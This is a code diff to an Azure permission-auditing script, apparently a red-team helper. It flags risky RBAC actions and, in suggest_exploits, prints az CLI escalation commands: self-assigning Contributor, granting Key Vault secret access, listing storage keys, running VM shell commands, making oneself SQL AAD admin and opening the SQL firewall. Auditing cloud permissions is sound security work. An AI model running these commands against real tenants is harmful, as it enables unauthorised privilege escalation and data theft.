@@ -12,20 +12,36 @@ INTERESTING_ACTIONS = {
     # Key Vault mgmt-plane (policy edits; vault writes)
     r"^Microsoft\.KeyVault/vaults/accessPolicies/write$": "KV access policy write → can grant data-plane perms (set-policy).",
     r"^Microsoft\.KeyVault/vaults/write$": "KV vault write → often implies policy edits / config changes.",
+
     # Role/Assignment manipulation (RBAC escalation)
     r"^Microsoft\.Authorization/roleAssignments/write$": "Write role assignments → assign yourself higher perms.",
     r"^Microsoft\.Authorization/roleDefinitions/write$": "Write role definitions → craft a custom escalator role.",
+
     # Managed Identity pivot
     r"^Microsoft\.ManagedIdentity/userAssignedIdentities/assign/action$": "Assign UAI → run workloads with new identity.",
+
     # Automation / Run command / Script runners (code exec on infra)
-    r"^Microsoft\.Automation/automationAccounts/*": "Automation powers (runbooks) → potential code execution.",
+    r"^Microsoft\.Automation/automationAccounts/.*": "Automation powers (runbooks) → potential code execution.",
     r"^Microsoft\.Compute/virtualMachines/runCommand/action$": "VM runCommand → remote code execution on VM.",
     r"^Microsoft\.Web/sites/write$": "App Service write → deploy code/modify app settings.",
+
     # Storage account keys (data exfil / SAS minting)
     r"^Microsoft\.Storage/storageAccounts/listKeys/action$": "List storage keys → full data access to that account.",
+
     # Key Vault data-plane (if RBAC mode enabled on a vault)
     r"^Microsoft\.KeyVault/vaults/secrets/read$": "Mgmt read (metadata) of secrets; not the value but useful recon.",
     r"^Microsoft\.KeyVault/vaults/keys/read$": "Mgmt read (metadata) of keys.",
+
+    # ---------- Azure SQL (new) ----------
+    # Set or overwrite AAD admin at the SQL Server (logical server) → become DB admin via AAD.
+    r"^Microsoft\.Sql/servers/administrators/write$": "SQL: set AAD admin on server → sign in as that principal to all DBs.",
+    # Open firewall to your IP so you can reach the endpoint.
+    r"^Microsoft\.Sql/servers/firewallRules/write$": "SQL: write firewall rules → allow your IP to connect.",
+    # Broad server writes (may allow auth mode flips or other impactful changes depending on policy).
+    r"^Microsoft\.Sql/servers/write$": "SQL: server write → modify server-level settings (potentially impactful).",
+    # Database write (create/modify DBs; combined with AAD admin often enough for full control).
+    r"^Microsoft\.Sql/servers/databases/write$": "SQL: database write → create/alter DBs (pair with AAD admin for takeover).",
+
     # Broad wildcards
     r"^\*$": "Wildcard: full control at this scope."
 }
@@ -78,7 +94,7 @@ def analyze_permissions(role_def: dict):
         data_actions = p.get("dataActions", []) or []
         not_data = p.get("notDataActions", []) or []
 
-        # Filter explicit actions (minus notActions)
+        # Effective sets (minus explicit denies)
         eff_actions = [a for a in actions if a not in not_actions]
         eff_data = [a for a in data_actions if a not in not_data]
 
@@ -105,23 +121,62 @@ def summarize_findings(findings):
 def suggest_exploits(summary, scope):
     tips = []
     acts = [x[1] for x in summary]
+
     # Key Vault policy edit
     if any(re.match(r"^Microsoft\.KeyVault/vaults/accessPolicies/write$", a, re.I) for a in acts):
-        tips.append(f"KV policy write at this scope → if vault not in RBAC mode, run:\n"
-                    f"  az keyvault set-policy --name <vault> --spn <spn-or-appId> --secret-permissions get list")
+        tips.append(
+            "KV policy write at this scope → if vault not in RBAC mode, run:\n"
+            "  az keyvault set-policy --name <vault> --spn <spn-or-appId> --secret-permissions get list"
+        )
+
     # Role assignment write
     if any(re.match(r"^Microsoft\.Authorization/roleAssignments/write$", a, re.I) for a in acts):
-        tips.append("Can write role assignments → try self-assign at this scope:\n"
-                    "  az role assignment create --assignee <me> --role Contributor --scope " + scope)
+        tips.append(
+            "Can write role assignments → try self-assign at this scope:\n"
+            f"  az role assignment create --assignee <me> --role Contributor --scope {scope}"
+        )
+
     # Storage keys
     if any(re.match(r"^Microsoft\.Storage/storageAccounts/listKeys/action$", a, re.I) for a in acts):
-        tips.append("List storage keys → enumerate accounts and pull keys:\n"
-                    "  az storage account list -o table\n"
-                    "  az storage account keys list -g <rg> -n <acct>")
+        tips.append(
+            "List storage keys → enumerate accounts and pull keys:\n"
+            "  az storage account list -o table\n"
+            "  az storage account keys list -g <rg> -n <acct>"
+        )
+
     # VM runCommand
     if any(re.match(r"^Microsoft\.Compute/virtualMachines/runCommand/action$", a, re.I) for a in acts):
-        tips.append("VM runCommand present → code exec on VMs:\n"
-                    "  az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts 'id'")
+        tips.append(
+            "VM runCommand present → code exec on VMs:\n"
+            "  az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts 'id'"
+        )
+
+    # ---------- Azure SQL pivots ----------
+    sql_admin = any(re.match(r"^Microsoft\.Sql/servers/administrators/write$", a, re.I) for a in acts)
+    sql_fw    = any(re.match(r"^Microsoft\.Sql/servers/firewallRules/write$", a, re.I) for a in acts)
+
+    if sql_admin:
+        tips.append(
+            "SQL server AAD admin writable → set yourself (or a controlled SPN) as AAD admin, then connect with AAD token:\n"
+            "  az sql server ad-admin upsert -g <rg> -s <sql-server-name> \\\n"
+            "    --display-name <my-principal-name> --object-id <my-principal-objectId>\n"
+            "  # Get AAD access token for SQL and connect (AAD auth):\n"
+            "  TOKEN=$(az account get-access-token --resource https://database.windows.net --query accessToken -o tsv)\n"
+            "  sqlcmd -S <sql-server-name>.database.windows.net -d <db> -G -l 30 -Q \"SELECT name FROM sys.databases\""
+        )
+
+    if sql_fw:
+        tips.append(
+            "SQL firewall rules writable → open access from your IP so you can reach the endpoint:\n"
+            "  MYIP=$(curl -s ifconfig.me)\n"
+            "  az sql server firewall-rule create -g <rg> -s <sql-server-name> -n allow_me \\\n"
+            "    --start-ip-address $MYIP --end-ip-address $MYIP"
+        )
+
+    if sql_admin and sql_fw:
+        tips.append(
+            "Combine AAD admin + firewall rule: set admin → open firewall → AAD token → enumerate/modify DBs as needed."
+        )
 
     return tips
 
@@ -148,7 +203,7 @@ def main():
         principal = a.get("principalId")
         principal_name = a.get("principalName") or principal
         role_def = get_role_definition_by_id(role_def_id)
-        if not role_def:  # shouldn’t happen, but shrug
+        if not role_def:
             continue
 
         role_name = role_def["roleName"]
@@ -185,8 +240,7 @@ def main():
                 print("    - (no flagged actions; review raw permissions if curious)")
         print()
 
-    # Suggestions (only if single scope)
-    # Collate all summaries
+    # Suggestions
     all_summary = []
     for e in report:
         all_summary.extend(e["findings"])
